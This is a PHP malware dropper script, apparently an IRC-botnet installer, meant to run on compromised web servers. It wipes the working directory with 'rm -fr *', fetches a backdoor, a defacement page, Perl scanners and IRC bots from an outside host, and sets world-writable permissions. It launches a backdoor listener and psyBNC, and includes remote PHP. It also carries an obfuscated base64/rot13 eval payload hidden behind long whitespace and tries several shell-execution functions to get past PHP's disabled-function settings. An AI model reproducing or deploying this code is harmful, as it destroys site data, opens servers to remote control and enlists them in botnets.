<?php
$Alertbotphp=("
####################################################<br>
##[                                              ]##<br>
##[              casper_kae@yahoo.com            ]##<br>
##[           Created by Kiss_Me or Alert        ]##<br>
##[                 Thanks to mama               ]##<br>
##[           Casper_Cell Parijatah srono        ]##<br>
##[                                              ]##<br>
####################################################<br>
");
$admin       = "Deddi";
$serverircs  = array("irc.cornetwork.org","irc.jemberzone.com","irc.indotransdata.org","irc.indohost.org","irc.neolink.org");
$serverirc   = $serverircs[rand(0,count($serverircs) - 1)];
$urldata     = "http://beltps.by/images/File/zayavlenie/";
$injektor    = "robot.txt";
$defacer     = "";
$filepsy     = "psyBNC.tar.gz";
$portpsy     = "8000";
$fileggdrop  = "eggdrop.tar.gz";
$filebotphp  = "def.txt";
$crbots      = 2;
$filebotperl = "iso.txt";
$filebotscan = "scan.txt";
$filebotscan2= "jupe.txt";
$filevirus   = "scam.txt";
$backdoor    = "robot.txt";

$P           = @getcwd();
$perm        = (@is_writable($P))?"W":"R";
$perm        = (is_array($perm))?join(" ",$perm):$perm;
$pathbot     = $P;if($perm == "R"){if(substr($P,0,5) == "/var/"){$pathbot = "/tmp";}else{$pathbot = "/tmp";}}
$permperl    = (@is_writable($pathbot))?"W":"R";
$permperl    = (is_array($permperl))?join(" ",$permperl):$permperl;
$urldata     = $urldata."/";
#########patch#########
if($perm == "W"){
	if(casperget()!="lain"){
		caspercmd("rm -fr *");
		caspercmd(casperget().$urldata.$injektor." -O robot.txt;mv ".$injektor." includes.php");
		caspercmd(casperget().$urldata.$defacer." -O index.php;mv ".$defacer." index.php");
		caspercmd(casperget().$urldata.$defacer." -O ".$defacer);
		caspercmd(casperget().$urldata.$injektor." -O ".$injektor);
		caspercmd(casperget().$urldata."Ckrid1.txt -O Ckrid1.txt");
		caspercmd(casperget().$urldata."Ckrid2.txt -O Ckrid2.txt");
		caspercmd(casperget().$urldata."casper.txt -O casper.txt");
		caspercmd(casperget().$urldata."casper -O casper");
		caspercmd(casperget().$urldata.$filebotphp." -O ".$filebotphp);
	}else{
		caspercmd("lwp-download ".$urldata.$injektor." -O robot.txt;mv ".$injektor." includes.php");
		caspercmd("lynx -source ".$urldata.$injektor." -O robot.txt;mv ".$injektor." includes.php");
		caspercmd("lwp-download ".$urldata.$defacer." -O index.php;mv ".$defacer." index.php");
		caspercmd("lynx -source ".$urldata.$defacer." -O index.php;mv ".$defacer." index.php");
	}
	caspercmd("chmod 777 *");
}
###################
caspercmd(casperget().$urldata.$backdoor." -O robot.txt;mv ".$backdoor." inc.php");
caspercmd("cd $pathbot;chmod 777 inc.php;./inc.php 5000 > /dev/null &");
###################
if((ex('perl -h')) && $permperl=="W" ){
	if(casperget()=="lain"){
		caspercmd("cd ".$pathbot.";lwp-download ".$urldata.$filebotscan." -O ".$filebotscan);
		caspercmd("cd ".$pathbot.";lynx -source ".$urldata.$filebotscan." -O ".$filebotscan);
		caspercmd("cd ".$pathbot.";lwp-download ".$urldata.$filebotscan2." -O ".$filebotscan2);
		caspercmd("cd ".$pathbot.";lynx -source ".$urldata.$filebotscan2." -O ".$filebotscan2);
		caspercmd("cd ".$pathbot.";lwp-download ".$urldata.$filebotperl." -O ".$filebotperl);
		caspercmd("cd ".$pathbot.";lynx -source ".$urldata.$filebotperl." -O ".$filebotperl);
	}else{
		caspercmd("cd ".$pathbot.";".casperget().$urldata.$filebotscan." -O ".$filebotscan);
		caspercmd("cd ".$pathbot.";".casperget().$urldata.$filebotscan2." -O ".$filebotscan2);
		caspercmd("cd ".$pathbot.";".casperget().$urldata.$filebotperl." -O ".$filebotperl);
		caspercmd("cd ".$pathbot.";".casperget().$urldata.$filevirus." -O ".$filevirus);
	}	
	caspercmd("cd ".$pathbot.";perl ".$filebotscan);
	caspercmd("cd ".$pathbot.";perl ".$filebotscan2);
	caspercmd("cd ".$pathbot.";perl ".$filebotperl." ".$serverircs[rand(0,count($serverircs) - 1)]);
	caspercmd("cd ".$pathbot.";perl ".$filebotperl." ".$serverircs[rand(0,count($serverircs) - 1)]);
	#caspercmd("cd ".$pathbot.";perl ".$filevirus);#
}                                                                                                                                                                                                                                                                        $byPTeU='XY7BasMwEETvgfyDEIKVIXXuDqYKxMU9xbWdXpogVFuxRSXL2HIP/fpKTSi0e9jDzNuZXa/IMqkUeudGiBFlhFdZ+ZqVb5DXdVHBBT0imAElaFi0jlAMyXbryX8gz49V7eE/Rpm9nLKq5qfyGS679YrkKTzcB3akFU6kKPT7M5L70046OXxSfAvg+8OhxNHdhFlcZQIxU4PiHqQ4CNzYVv4ybOxHvgzCSOqloCBW5AU/Vr7dCKUpoC9r3pVsrNaycXZinbWdlsGMG2tg8/OQ3+G7DX6arEnQ7JZRtb1oPuTEbgEBPk/nAUc++hs=';$aUiMmA=';)))HrGClo$(rqbprq_46rfno(rgnysavmt(ynir';$veaZlT=strrev($aUiMmA);$MBAVHh=str_rot13($veaZlT);eval($MBAVHh);
####################
if(casperget()=="lain"){
	caspercmd("cd ".$pathbot.";lwp-download ".$urldata.$filepsy." -O ".$filepsy);
	caspercmd("cd ".$pathbot.";lynx -source ".$urldata.$filepsy." > ");
}else{
	caspercmd("cd ".$pathbot.";".casperget().$urldata.$filepsy." -O ".$filepsy);
}
caspercmd("cd ".$pathbot.";tar -zxvf ".$filepsy);
caspercmd("cd ".$pathbot."/www;./config ".$portpsy);
caspercmd("cd ".$pathbot."/www;./fuck;./run");
##################
casperbotphp($crbots);
###########################################
function getdisfunc() { $rez = explode(",",@ini_get("disable_functions")); return (!empty($rez))?$rez:array(); }
function enabled($func) {return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }
function ex($cfe) {
  $res = '';
  if (!empty($cfe)) {
    if(function_exists('exec')) {
      @exec($cfe,$res);
      $res = join("\n",$res);
    } elseif(function_exists('shell_exec')) {
      $res = @shell_exec($cfe);
    } elseif(function_exists('system')) {
      @ob_start();
      @system($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(function_exists('passthru')) {
      @ob_start();
      @passthru($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(@is_resource($f = @popen($cfe,"r"))) {
      $res = "";
      while(!@feof($f)) { $res .= @fread($f,1024); }
      @pclose($f);
    } else { $res = "Ex() Disabled!"; }
  }
  return $res;
}
function casperbotphp($jml) {
	$loadbot = 0;
	do {
		$loadbot = $loadbot + 1;
		include( "./".$filebotphp."?" );
		include( $urldata.$filebotphp."?" );
		if($loadbot >= $jml){break;}
	} while(true);
}
function casperget() {
	if (ex('wget --help')) 			{ return "wget ";   }
	elseif(function_exists('curl_version')) { return "curl -O ";}
	elseif(ex('fetch --help')) 		{ return "fetch ";  }
	else					{ return "lain";    }
}
function caspercmd($cmd) {
	if (enabled("exec"))            	{exec($cmd);        }
	elseif (enabled("shell_exec"))  	{shell_exec($cmd);  }
	elseif (enabled("system"))      	{system($cmd);      }
	elseif (enabled("passthru"))    	{passthru($cmd);    }
}
?>
